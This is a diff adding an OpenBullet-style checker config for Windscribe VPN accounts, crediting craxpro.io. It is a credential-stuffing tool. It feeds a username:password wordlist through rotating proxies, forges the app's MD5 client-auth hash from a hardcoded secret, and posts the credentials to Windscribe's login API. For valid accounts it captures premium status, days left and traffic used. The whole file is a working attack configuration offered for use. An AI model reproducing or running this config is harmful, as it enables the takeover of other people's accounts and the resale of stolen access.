@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "WindscribeVPN",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-25T22:44:57.1161951+06:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "For More Visit craxpro.io",
+      "VariableName": "T",
+      "Id": 232259633
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GetTime REQUEST GET "https://play.googleapis.com/play/log/timestamp" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Time PARSE "<SOURCE>" LR "" "" -> VAR "Time" 
+
+#Hash FUNCTION Hash MD5 "952b4412f002315aa50751032fcaab03<Time>" -> VAR "Hash" 
+
+#Login REQUEST POST "https://api.staticnetcontent.com/Session?platform=android&password=<PASS>&client_auth_hash=<Hash>&time=<Time>&username=<USER>&session_type_id=4" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 0" 
+  HEADER "Host: api.staticnetcontent.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not log in with provided credentials" 
+  KEYCHAIN Success OR 
+    KEY "is_premium" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_premium\": 0" 
+
+#Username PARSE "<SOURCE>" LR "\"username\": \"" "\"" -> CAP "Username" 
+
+#Expiry PARSE "<SOURCE>" LR "\"premium_expiry_date\": \"" "\"" -> CAP "Expiry" 
+
+#TimeNow FUNCTION CurrentUnixTime -> VAR "TimeNow" 
+
+#UnixExpiry FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry>" -> VAR "UnixExpiry" 
+
+#Compute FUNCTION Compute "(<UnixExpiry>-<TimeNow>)/86400" -> VAR "Compute" 
+
+#DaysLeft FUNCTION Round "<Compute>" -> CAP "DaysLeft" 
+
+#TR PARSE "<SOURCE>" LR "\"traffic_used\": " "," -> VAR "TR" 
+
+#TR1 FUNCTION Compute "<TR>/1024" -> VAR "TR1" 
+
+#TR2 FUNCTION Compute "<TR1>/1024" -> VAR "TR2" 
+
+#TR3 FUNCTION Compute "<TR2>/1024" -> VAR "TR3" 
+
+#TR4 FUNCTION Round "<TR3>" -> VAR "TR4" 
+
+#TrafficUsed FUNCTION Constant "<TR4>GB" -> CAP "TrafficUsed" 
+
